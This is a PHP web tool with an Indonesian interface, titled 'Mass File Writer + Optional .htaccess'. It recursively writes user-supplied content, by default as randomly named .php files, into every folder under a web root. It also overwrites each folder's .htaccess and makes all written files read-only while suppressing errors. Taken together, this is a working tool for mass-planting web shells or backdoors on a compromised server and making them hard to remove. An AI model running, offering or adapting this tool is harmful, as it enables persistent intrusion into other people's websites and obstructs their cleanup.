<?php
error_reporting(0);
set_time_limit(0);

$logFile = __DIR__ . '/hasil.txt';
file_put_contents($logFile, "");

function randomFileName($length = 12, $ext = '') {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $name = '';
    for ($i = 0; $i < $length; $i++) {
        $name .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $name . $ext;
}

function getAllFolders($root) {
    $folders = [];
    if (!is_dir($root)) return $folders;
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $item) {
        if ($item->isDir()) $folders[] = $item->getPathname();
    }
    $folders[] = $root;
    return $folders;
}

$message = "";
$outputLog = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['root_path'])) {
    $rootPath = trim($_POST['root_path']);
    $fileContent = $_POST['file_content'];
    $htaccessContent = trim($_POST['htaccess_content']);
    $fileExt = '.' . trim($_POST['file_ext'], '.');

    if (!is_dir($rootPath)) {
        $message = "❌ Folder root tidak ditemukan: $rootPath";
    } else {
        $allFolders = getAllFolders($rootPath);

        foreach ($allFolders as $folder) {
            if (!is_dir($folder)) mkdir($folder, 0777, true);

            if (is_writable($folder)) {
                if (!empty($fileContent)) {
                    $targetFile = rtrim($folder, '/') . '/' . randomFileName(12, $fileExt);
                    if (@file_put_contents($targetFile, $fileContent) !== false) {
                        $outputLog[] = "✅ File: $targetFile";
                        file_put_contents($logFile, $targetFile . PHP_EOL, FILE_APPEND);
                        @chmod($targetFile, 0444);
                    } else {
                        $outputLog[] = "❌ Gagal membuat file di $folder";
                    }
                }

                if (!empty($htaccessContent)) {
                    $htFile = rtrim($folder, '/') . '/.htaccess';
                    if (@file_put_contents($htFile, $htaccessContent) !== false) {
                        $outputLog[] = "✅ .htaccess: $htFile";
                        @chmod($htFile, 0444);
                    } else {
                        $outputLog[] = "❌ Gagal membuat .htaccess di $folder";
                    }
                }
            } else {
                $outputLog[] = "⚠️ Folder tidak writable: $folder";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Mass File Writer + Optional .htaccess (Dark Mode)</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: #121212;
        color: #e0e0e0;
        margin: 0;
        padding: 0;
    }
    .container {
        max-width: 900px;
        margin: 30px auto;
        background: #1e1e1e;
        padding: 20px 30px;
        border-radius: 10px;
        box-shadow: 0px 3px 15px rgba(0,0,0,0.4);
    }
    h2 {
        text-align: center;
        color: #00ffcc;
    }
    label {
        font-weight: bold;
        display: block;
        margin-top: 15px;
        color: #b0b0b0;
    }
    input[type="text"], textarea {
        width: 100%;
        padding: 10px;
        margin-top: 5px;
        border-radius: 6px;
        border: 1px solid #333;
        background: #2a2a2a;
        color: #fff;
        font-family: monospace;
        font-size: 14px;
    }
    textarea {
        resize: vertical;
    }
    .btn {
        margin-top: 20px;
        background: linear-gradient(90deg, #00ffcc, #0077ff);
        color: white;
        border: none;
        padding: 12px 20px;
        font-size: 16px;
        border-radius: 6px;
        cursor: pointer;
        width: 100%;
        font-weight: bold;
    }
    .btn:hover {
        background: linear-gradient(90deg, #00e6b8, #0066cc);
    }
    .message {
        margin-top: 15px;
        padding: 10px;
        border-radius: 6px;
        font-weight: bold;
    }
    .error { background: #4d0000; color: #ff6666; }
    .success { background: #003300; color: #66ff66; }
    .log {
        margin-top: 20px;
        background: #000;
        color: #00ff88;
        padding: 15px;
        border-radius: 6px;
        font-family: monospace;
        max-height: 400px;
        overflow-y: auto;
        white-space: pre-wrap;
    }
</style>
</head>
<body>
<div class="container">
    <h2>🌙 Mass File Writer + Optional .htaccess</h2>
    <form method="post">
        <label>Path Root:</label>
        <input type="text" name="root_path" required placeholder="/var/www/html/">

        <label>Ekstensi File:</label>
        <input type="text" name="file_ext" value="php">

        <label>Isi File (kosongkan jika tidak ingin membuat file):</label>
        <textarea name="file_content" rows="8" placeholder="<?php echo '&lt;?php echo &quot;Hello World&quot;; ?&gt;'; ?>"></textarea>

        <label>Isi .htaccess (kosongkan jika tidak ingin membuat):</label>
        <textarea name="htaccess_content" rows="5" placeholder="Kosongkan jika tidak ingin membuat .htaccess"></textarea>

        <button type="submit" class="btn">🚀 GASKAN</button>
    </form>

    <?php if ($message): ?>
        <div class="message error"><?php echo $message; ?></div>
    <?php endif; ?>

    <?php if (!empty($outputLog)): ?>
        <div class="log">
            <?php foreach ($outputLog as $line) echo htmlspecialchars($line) . "\n"; ?>
        </div>
    <?php endif; ?>
</div>
</body>
</html>
